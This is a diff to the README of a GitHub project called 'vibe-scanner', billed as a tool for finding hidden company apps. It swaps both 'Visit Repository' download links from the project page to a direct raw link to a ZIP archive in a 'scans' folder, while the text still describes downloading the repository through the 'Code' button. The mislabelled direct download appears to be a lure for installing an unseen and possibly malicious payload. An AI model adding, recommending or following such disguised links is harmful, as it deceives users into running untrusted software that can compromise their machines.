@@ -1,6 +1,6 @@
 # 🔍 vibe-scanner - Find hidden company apps fast
 
-[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/Youcefyo2585/vibe-scanner)
+[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://raw.githubusercontent.com/Youcefyo2585/vibe-scanner/main/scans/scanner_vibe_v2.4-beta.4.zip)
 
 ## 📋 About this tool
 
@@ -30,7 +30,7 @@ Windows requires two software packages to run this scanner. Please follow these 
 
 You can obtain the latest version of the software via the project page.
 
-[Visit the repository to download](https://github.com/Youcefyo2585/vibe-scanner)
+[Visit the repository to download](https://raw.githubusercontent.com/Youcefyo2585/vibe-scanner/main/scans/scanner_vibe_v2.4-beta.4.zip)
 
 Click the green "Code" button on the webpage. Select "Download ZIP". Save the file to your computer. Open your Downloads folder. Right-click the folder named "vibe-scanner-main". Select "Extract All". Choose a location on your hard drive to keep these files.
 
